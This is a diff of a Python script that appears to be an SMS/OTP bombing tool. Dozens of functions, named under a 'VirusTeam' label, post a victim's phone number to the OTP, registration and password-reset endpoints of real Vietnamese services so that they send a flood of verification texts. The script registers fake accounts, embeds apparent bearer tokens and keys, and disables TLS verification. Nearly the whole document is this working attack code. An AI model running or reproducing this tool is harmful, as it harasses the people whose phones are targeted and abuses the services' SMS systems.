     'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Mobile Safari/537.36',
   }
   data = {
-    'sodienthoai': phone,
+    'sodienthoai': sdt_vs,
     'ten_server': 'Server-IPv1',
     'key': 'freekey307',
   }
   response = requests.post('https://crowstore.online/sms.php', cookies=cookies, headers=headers, data=data).text
-def VsTeamHttpRequests48(phone):
+def VsTeamHttpRequests48(sdt_vs):
     Batdongsan_Api = f'https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister'
     params = {
-        'phoneNumber': phone
+        'phoneNumber': sdt_vs
     }
     response = requests.get(Batdongsan_Api, params=params)
-def VsTeamHttpRequests49(phone):
+def VsTeamHttpRequests49(sdt_vs):
   headers = {
     'Host': 'www.sapo.vn',
     # 'content-length': '22',
@@ -1842,11 +1842,11 @@ def VsTeamHttpRequests49(phone):
     # 'cookie': '_gcl_au=1.1.1060296146.1691285262; _gid=GA1.2.497444655.1691285263; _ga_YNVPPJ8MZP=GS1.1.1691285263.1.0.1691285263.60.0.0; _ga=GA1.1.1816034013.1691285263; _ga_8956TVT2M3=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_CDD1S5P7D4=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_GECRBQV6JK=GS1.1.1691285264.1.0.1691285264.60.0.0; _ga_Y9YZPDEGP0=GS1.1.1691285265.1.0.1691285265.60.0.0; start_time=08/06/2023 8:27:45; source=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; _ga_X10JR147Y7=GS1.1.1691285264.1.0.1691285265.59.0.0; _fbp=fb.1.1691285267174.309606627; _ga_EBZKH8C7MK=GS1.2.1691285267.1.0.1691285267.0.0.0; referral=https://www.google.com/; landing_page=https://www.sapo.vn/blog/mat-hang-kinh-doanh-hot-nhat-hien-nay; pageview=1; _ga_8Z6MB85ZM2=GS1.1.1691285265.1.1.1691285333.60.0.0',
     }
   data = {
-    'phonenumber': f'{phone}',
+    'phonenumber': f'{sdt_vs}',
   }
   response = requests.post('https://www.sapo.vn/fnb/sendotp', headers=headers, data=data).json()
-def VsTeamHttpRequests50(phone):
-    url = f'https://api.glxplay.io/account/phone/verify?phone={phone}'
+def VsTeamHttpRequests50(sdt_vs):
+    VirusTeam_Url = f'https://api.glxplay.io/account/phone/verify?phone={sdt_vs}'
     headers = {
         "host": "api.glxplay.io",
         "content-length": "0",
@@ -1866,9 +1866,9 @@ def VsTeamHttpRequests50(phone):
         "accept-encoding": "gzip, deflate, br, zstd",
         "priority": "u=1, i"
     }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, verify=False)
-def VsTeamHttpRequests51(phone):
-    url = 'https://api.vloan.xyz/api/register/app/sendSms'
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, verify=False)
+def VsTeamHttpRequests51(sdt_vs):
+    VirusTeam_Url = 'https://api.vloan.xyz/api/register/app/sendSms'
     headers = {
         "host": "api.vloan.xyz",
         "connection": "keep-alive",
@@ -1903,7 +1903,7 @@ def VsTeamHttpRequests51(phone):
         
     }
     payload = {
-    "phone": phone,
+    "phone": sdt_vs,
     "type": 2,
     "timestamp": 1719665082806,
     "referrer": "utm_source=fb4a",
@@ -1917,14 +1917,14 @@ def VsTeamHttpRequests51(phone):
     "uuid": "7a5e23b6e63755bfca7774ce004991d8",
     "pkg_name": "com.qcloan.vloanh5"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
     #Khoaaaaaaaaaaaaaaaaaaaaaa
-def gumac(phone):#1
-    url = 'https://cms.gumac.vn/api/v1/customers/verify-phone-number'
+def gumac(sdt_vs):#1
+    VirusTeam_Url = 'https://cms.gumac.vn/api/v1/customers/verify-phone-number'
     headers = {
         'Accept': 'application/json',
         'Accept-Encoding': 'gzip, deflate, br, zstd',
@@ -1944,14 +1944,14 @@ def gumac(phone):#1
         'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
     }
     payload = {
-        "phone": phone
+        "phone": sdt_vs
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def tokyofile(phone):#2
+def tokyofile(sdt_vs):#2
     url = 'https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register'
     headers = {
     'Accept': 'application/json, text/plain, */*',
@@ -1974,7 +1974,7 @@ def tokyofile(phone):#2
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
 }
     payload = {
-  "phone_number": phone,
+  "phone_number": sdt_vs,
   "name": "khoa pham",
   "password": "@@Bulon123",
   "email": "sjcijajcnbkans@gmail.com",
@@ -1986,10 +1986,10 @@ def tokyofile(phone):#2
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def batdongsan(phone): #3
+def batdongsan(sdt_vs): #3
     url = "https://batdongsan.com.vn/user-management-service/api/v1/Otp/SendToRegister"
     payload = {
-    'phoneNumber': phone
+    'phoneNumber': sdt_vs
 }
     headers = {
     'Accept': 'application/json, text/plain, */*',
@@ -2012,7 +2012,7 @@ def batdongsan(phone): #3
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def hoangphuc(phone):#4
+def hoangphuc(sdt_vs):#4
     url = "https://hoang-phuc.com/advancedlogin/otp/sendotp/"
     headers = {
     'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2037,7 +2037,7 @@ def hoangphuc(phone):#4
 }
 
     payload = {
-    'tel': phone,
+    'tel': sdt_vs,
     'action_type': '1'  
 }
     VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
@@ -2045,7 +2045,7 @@ def hoangphuc(phone):#4
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def ghn(phone):#5
+def ghn(sdt_vs):#5
     url = "https://online-gateway.ghn.vn/sso/public-api/v2/client/checkexistphone"
     headers = {
     'Accept': 'application/json, text/plain, */*',
@@ -2065,14 +2065,14 @@ def ghn(phone):#5
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
 }
     payload = {
-    "Phone": phone
+    "Phone": sdt_vs
 }
     VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def zcfc(phone):#6
+def zcfc(sdt_vs):#6
     url = "https://www.acfc.com.vn/customer/section/load/"
     headers = {
     'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2094,14 +2094,14 @@ def zcfc(phone):#6
     payload = {
     'sections': 'messages',
     'force_new_section_timestamp': 'true',
-    '_': phone 
+    '_': sdt_vs 
 }
     VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def routine(phone):#7
+def routine(sdt_vs):#7
     url = "https://routine.vn/customer/otp/send/"
     headers = {
     'Accept': 'application/json, text/javascript, */*; q=0.01',
@@ -2123,7 +2123,7 @@ def routine(phone):#7
 }
 
     payload = {
-    'telephone': phone,
+    'telephone': sdt_vs,
     'isForgotPassword': '0'  
 }
     VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
@@ -2131,7 +2131,7 @@ def routine(phone):#7
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def theface(phone):#8
+def theface(sdt_vs):#8
     url = "https://tfs-api.hsv-tech.io/client/phone-verification/request-verification"
     headers = {
     'Accept': 'application/json, text/plain, */*',
@@ -2153,18 +2153,18 @@ def theface(phone):#8
     'timestamp': '1721585724723',
     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36'
 }
-    if phone.startswith("0"):
-        phone = phone[1:]
-        phone = "84" + phone
+    if sdt_vs.startswith("0"):
+        sdt_vs = sdt_vs[1:]
+        sdt_vs = "84" + sdt_vs
     payload = {
-    f"phoneNumber": phone
+    f"phoneNumber": sdt_vs
 }
     VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def shine(phone):#9
+def shine(sdt_vs):#9
     url = "https://ls6trhs5kh.execute-api.ap-southeast-1.amazonaws.com/Prod/otp/send"
     headers = {
     "Accept": "application/json",
@@ -2183,18 +2183,18 @@ def shine(phone):#9
     "Sec-Fetch-Site": "cross-site",
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
 }
-    if phone.startswith("0"):
-        phone = phone[1:]
-        phone = "84" + phone
+    if sdt_vs.startswith("0"):
+        sdt_vs = sdt_vs[1:]
+        sdt_vs = "84" + sdt_vs
         payload = {
-    "phone": phone
+    "phone": sdt_vs
 }
         VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def vieon(phone):#10
+def vieon(sdt_vs):#10
     url = "https://api.vieon.vn/backend/user/v2/register?platform=web&ui=012021"
     headers = {
     "Accept": "application/json, text/plain, */*",
@@ -2213,7 +2213,7 @@ def vieon(phone):#10
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
 }
     payload = {
-    "username": phone,
+    "username": sdt_vs,
     "country_code": "VN",
     "model": "Windows 10",
     "device_name": "Chrome/126",
@@ -2225,7 +2225,7 @@ def vieon(phone):#10
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def lotte(phone):#11
+def lotte(sdt_vs):#11
     url = "https://www.lottemart.vn/v1/p/mart/bos/vi_vih/V1/mart-sms/sendotp"
     headers = {
     "Accept": "application/json",
@@ -2246,7 +2246,7 @@ def lotte(phone):#11
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36"
 }
     payload = {
-    "username": phone,
+    "username": sdt_vs,
     "case": "register"
 }
     VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, json=payload, verify=False)
@@ -2254,8 +2254,8 @@ def lotte(phone):#11
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def galaxy(phone):#12
-    url = f"https://api.glxplay.io/account/phone/verify?phone={phone}"
+def galaxy(sdt_vs):#12
+    url = f"https://api.glxplay.io/account/phone/verify?phone={sdt_vs}"
     headers = {
     "Accept": "*/*",
     "Accept-Encoding": "gzip, deflate, br, zstd",
@@ -2280,8 +2280,8 @@ def galaxy(phone):#12
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests52(phone):
-    url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification'
+def VsTeamHttpRequests52(sdt_vs):
+    VirusTeam_Url = 'https://api.nhathuoclongchau.com.vn/lccus/is/user/new-send-verification'
     headers = {
         "host": "api.nhathuoclongchau.com.vn",
         "content-length": "60",
@@ -2307,17 +2307,17 @@ def VsTeamHttpRequests52(phone):
         
     }
     payload = {
-    "phoneNumber": phone,
+    "phoneNumber": sdt_vs,
     "otpType": 0,
     "fromSys": "WEBKHLC"
 }
-    VirusTeam_PhanHoiTuWeb = requests.post(url, headers=headers, cookies=cookies, json=payload, verify=False)
+    VirusTeam_PhanHoiTuWeb = requests.post(VirusTeam_Url, headers=headers, cookies=cookies, json=payload, verify=False)
     try:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.json()
     except requests.exceptions.JSONDecodeError:
         return VirusTeam_PhanHoiTuWeb.status_code, VirusTeam_PhanHoiTuWeb.text
-def VsTeamHttpRequests53(phone):
-    url = 'https://vietloan.vn/register/phone-change'
+def VsTeamHttpRequests53(sdt_vs):
+    VirusTeam_Url = 'https://vietloan.vn/register/phone-change'
     headers = {
         'authority': 'vietloan.vn',
         'accept': '*/*',
@@ -2366,485 +2366,11 @@ def VsTeamHttpRequests53(phone):
         '_ga_EBK41LH7H5': 'GS1.1.1720857924.3.1.1720859052.60.0.0',
     }
     params = {
-        'another_phone': phone
+        'another_phone': sdt_vs
     }
-    response = requests.get(url, params=params, cookies=cookies, headers=headers, verify=False)
-def VsTeamHttpRequests54(phone):
-	url = "https://api.ahamove.com/api/v3/public/user/login"
-	
-	payload = {
-		"mobile": phone,
-		"country_code": "VN",
-		"firebase_sms_auth": True,
-	}
-	
-	headers = {
-		"authority": "api.ahamove.com",
-		"accept": "application/json, text/plain, */*",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"content-type": "application/json;charset=UTF-8",
-		"origin": "https://app.ahamove.com",
-		"referer": "https://app.ahamove.com/",
-		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
-		"sec-ch-ua-mobile": "?0",
-		"sec-ch-ua-platform": "\"Windows\"",
-		"sec-fetch-dest": "empty",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-site": "same-site",
-		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-	}
-	
-	response = requests.post(url, headers=headers, json=payload)
-	
-	return dict(status=response.status_code, content=response.text)
+    response = requests.get(VirusTeam_Url, params=params, cookies=cookies, headers=headers, verify=False)
 
-def VsTeamHttpRequests55(phone):
-	url = "https://api.ahamove.com/api/v3/public/user/login"
+def VsTeamHttpRequests53(sdt_vs):
 	
-	payload = {
-		"mobile": phone,
-		"country_code": "VN",
-		"firebase_sms_auth": True,
-	}
-	
-	headers = {
-		"authority": "api.ahamove.com",
-		"accept": "application/json, text/plain, */*",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"content-type": "application/json;charset=UTF-8",
-		"origin": "https://app.ahamove.com",
-		"referer": "https://app.ahamove.com/",
-		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
-		"sec-ch-ua-mobile": "?0",
-		"sec-ch-ua-platform": "\"Windows\"",
-		"sec-fetch-dest": "empty",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-site": "same-site",
-		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
-	}
-	
-	response = requests.post('https://api.ahamove.com/api/v3/public/user/login', headers=headers, json=payload)
-	
-	return dict(status=response.status_code, content=response.text)
-def VsTeamHttpRequests56(phone):
-	url = "https://auth.pico.vn/user/api/auth/register"
-	url2 = "https://auth.pico.vn/user/api/auth/login/request-otp"
-	
-	payload = json.dumps({
-		"name": "Lê Quốc Việt ",
-		"phone": phone,
-		"provinceCode": "01",
-		"districtCode": "250",
-		"wardCode": "08989",
-		"address": f"{random.randint(10, 99)} Hồ Hoàng Kiếm, Hà Nội"
-	})
-	
-	payload2 = json.dumps({
-		"phone": phone
-	})
-
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Content-Type": "application/json",
-		"region-code": "MB",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"accept-language": "vi",
-		"sec-ch-ua-mobile": "?1",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://m.pico.vn",
-		"sec-fetch-site": "same-site",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://m.pico.vn/"
-	}
-	
-	headers2 = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/plain, */*",
-		"Content-Type": "application/json",
-		"party": "ecom",
-		"region-code": "MB",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"accept-language": "vi",
-		"access": "206f5b6838b4e357e98bf68dbb8cdea5",
-		"sec-ch-ua-mobile": "?1",
-		"uuid": "5387940ea6724ccaa540492c0e664451",
-		"platform": "Mobile",
-		"channel": "b2c",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://m.pico.vn",
-		"sec-fetch-site": "same-site",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://m.pico.vn/"
-	}
-		
-	requests.post(url, data=payload, headers=headers)
-	response = requests.post(url2, data=payload2, headers=headers2)
-	
-	return dict(status=response.status_code, content=response.text)
-def VsTeamHttpRequests57(phone):
-	url = "https://kvweb-api.kiotapi.com/auth/register/step-three"
-	
-	subdomain = "vrxx".join(random.choices(string.ascii_lowercase + string.digits, k=4))
-	
-	payload = json.dumps({
-		"authentication_type": "otp_oversea",
-		"fullname": "Lê Quốc Việt ",
-		"phone": phone,
-		"retailer_code": subdomain,
-		"location_name": "Hà Nội",
-		"username": phone,
-		"password": "922880",
-		"is_refcode_ctrl1": False,
-		"agree": True,
-		"crm_industry_value": "65",
-		"industry_id": 7,
-		"industry": "Điện thoại & Điện máy",
-		"access_address": f"{subdomain}.kiotviet.vn",
-		"access_domain": ".kiotviet.vn",
-		"country_phone": "vn",
-		"country": "VN",
-		"_key": "OE12azBIOXpDSlRqcktpUjNjR0s5ZFZ2UjNVZ2tSdE1oREpk",
-		"isOtp": False,
-		"city": "Hà Nội",
-		"original_ref_code": "",
-		"refered_by": "",
-		"source_referer": "%5B%22http-referral%7Cvn.search.yahoo.com%7C2024-05-20%7Ccrmutm%3D%2C%22%5D",
-		"lead_source_description": "vn.search.yahoo.com"
-	})
-		
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json",
-		"Content-Type": "application/json",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"cache-control": "no-cache",
-		"sec-ch-ua-mobile": "?1",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://www.kiotviet.vn",
-		"sec-fetch-site": "cross-site",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://www.kiotviet.vn/",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
-	}
-		
-	response = requests.post(url, data=payload, headers=headers)
-		
-	return dict(status=response.status_code, content=response.text)
-def VsTeamHttpRequests58(phone):
-	url = "https://api.suplo.vn/v1/auth/customer/otp/sms/generate"
-	
-	params = {
-		"domain": "pantiofashion.myharavan.com",
-	}
-		
-	payload = {
-		"phoneNumber": phone,
-	}
-	
-	headers = {
-		"accept": "*/*",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-		"origin": "https://pantio.vn",
-		"priority": "u=1, i",
-		"referer": "https://pantio.vn/",
-		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
-		"sec-ch-ua-mobile": "?0",
-		"sec-ch-ua-platform": "\"Windows\"",
-		"sec-fetch-dest": "empty",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-site": "cross-site",
-		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-	}
-		
-	response = requests.post(url, params=params, headers=headers, data=payload)
-	
-	return dict(status=response.status_code, content=response.text)
-def VsTeamHttpRequests59(phone):
-	url = "https://api.suplo.vn/v1/auth/customer/otp/sms/generate"
-	
-	params = {
-		"domain": "pantiofashion.myharavan.com",
-	}
-		
-	payload = {
-		"phoneNumber": phone,
-	}
-	
-	headers = {
-		"accept": "*/*",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5",
-		"content-type": "application/x-www-form-urlencoded; charset=UTF-8",
-		"origin": "https://pantio.vn",
-		"priority": "u=1, i",
-		"referer": "https://pantio.vn/",
-		"sec-ch-ua": "\"Google Chrome\";v=\"125\", \"Chromium\";v=\"125\", \"Not.A/Brand\";v=\"24\"",
-		"sec-ch-ua-mobile": "?0",
-		"sec-ch-ua-platform": "\"Windows\"",
-		"sec-fetch-dest": "empty",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-site": "cross-site",
-		"user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36",
-	}
-		
-	response = requests.post(url, params=params, headers=headers, data=payload)
-	
-	return dict(status=response.status_code, content=response.text)
-
-def VsTeamHttpRequests60(phone):
-	url = "https://api-omni.mutosi.com/client/auth/register"
-	url2 = "https://api-omni.mutosi.com/client/auth/reset-password/send-phone"
-	
-	payload = json.dumps({
-		"name": "Lê Quốc Việt",
-		"phone": phone,
-		"password": "Telegram@vrxx1337",
-		"confirm_password": "Telegram@vrxx1337",
-		"firstname": None,
-		"lastname": None,
-		"verify_otp": 0,
-		"store_token": "226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
-		"email": f"vrxxdev{random.randint(1, 999)}@gmail.com",
-		"birthday": f"2001-0{random.randint(1, 9)}-{random.randint(10, 29)}",
-		"accept_the_terms": 1,
-		"receive_promotion": 1
-	})
-	
-	payload2 = json.dumps({
-		"phone": phone,
-		"token": "03AFcWeA4W59pirg8OXzAOI2Bh55nLRuKgRkRc8sqRTov__qcJwUZ72iyyBgjMXhgCChrKf54tPzpvOG--I6Lefq54JdoZvQPr3wJRyrRID5UU_uogKC-qB3KPPX0i89q_RSx3F706J9RG2rNByywGoSUJQwomtSG1PlR6tFeM-Z8gvncmpDZwKDFMR7iip8IWjZRKk1o9YKOZ95LX6ep1Ieb7H85bvlOTHA3HYnhhdlOOhRniFCbnRgWq3BZeI9whO5Wzfwam0gulyWdX7arHeyRg7JP9ws5yCUHtjiLAr96CLampR04IGE9ltN35qjwifqkOlpzpEWDMXPR_ZfuQ-t00KvORV9WXPJ9MiKguMOtXlaHbgae1G7ER9wbBCPSrknvNWFPrUH0R6hj1OXEtN1-ChtYeyCroScrOOfUty0dTV6zr7Ds1EIFcvFePT4Lnz8Kzz1oR2DPMvdaSXGdhANtvVw6m6sCnqW9QuZ1q7eddWkBsGa4xKJcccwJRliWbDWZXqHV5zn-IUcft4gwXujv9b6vpl07_tfXXytWSWIsSLfHrMUcDheDbMmUxdxpoQrrGFiJUvtfBlv8ijhPFhAernAwDW1RVhRLVtZ93amYP9CdzfG9xHwdICqshWTR-_L8MxteMGv8y5zTDybH5XlNT2Ks7RFqMakuP9LYPtaPfE6EQnsb6Z8E",
-		"source": "web_consumers"
-	})
-	
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/plain, */*",
-		"Content-Type": "application/json",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"sec-ch-ua-mobile": "?1",
-		"Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
-		"sec-ch-ua-platform": "\"Android\"",
-		"Origin": "https://mutosi.com",
-		"Sec-Fetch-Site": "same-site",
-		"Sec-Fetch-Mode": "cors",
-		"Sec-Fetch-Dest": "empty",
-		"Referer": "https://mutosi.com/",
-		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
-	}
-	
-	headers2 = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/plain, */*",
-		"Accept-Encoding": "gzip, deflate, br, zstd",
-		"Content-Type": "application/json",
-		"sec-ch-ua": "\"Chromium\";v=\"124\", \"Google Chrome\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
-		"sec-ch-ua-mobile": "?1",
-		"Authorization": "Bearer 226b116857c2788c685c66bf601222b56bdc3751b4f44b944361e84b2b1f002b",
-		"sec-ch-ua-platform": "\"Android\"",
-		"Origin": "https://mutosi.com",
-		"Sec-Fetch-Site": "same-site",
-		"Sec-Fetch-Mode": "cors",
-		"Sec-Fetch-Dest": "empty",
-		"Referer": "https://mutosi.com/",
-		"Accept-Language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5,zh-CN;q=0.4,zh;q=0.3"
-	}
-	
-	requests.post(url, data=payload, headers=headers)
-	response = requests.post(url2, data=payload2, headers=headers2)
-		
-	return dict(status=response.status_code, content=response.text)
-
-def VsTeamHttpRequests61(phone):
-	url = "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/register"
-	url2 = "https://api-prod.tokyolife.vn/khachhang-api/api/v1/auth/forgot-password"
-
-	payload = json.dumps({
-		"phone_number": phone,
-		"name": "Nguyễn Duy",
-		"password": "@vrxx1337",
-		"email": f"vrxxdev{random.randint(1, 999)}@gmail.com",
-		"birthday": "2001-01-01",
-		"gender": random.choice(["male", "female"])
-	})
-	
-	payload2 = json.dumps({
-		"phone_number": phone
-	})
-		
-	headers = {
-		"User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36",
-		"Accept": "application/json, text/plain, */*",
-		"Content-Type": "application/json",
-		"sec-ch-ua": "\"Not-A.Brand\";v=\"99\", \"Chromium\";v=\"124\"",
-		"sec-ch-ua-mobile": "?1",
-		"timestamp": "1716263773508",
-		"signature": "218c64573564a4e6be914b4a85e3ec55",
-		"sec-ch-ua-platform": "\"Android\"",
-		"origin": "https://tokyolife.vn",
-		"sec-fetch-site": "same-site",
-		"sec-fetch-mode": "cors",
-		"sec-fetch-dest": "empty",
-		"referer": "https://tokyolife.vn/",
-		"accept-language": "vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5"
-	}
-	
-	headers2 = {
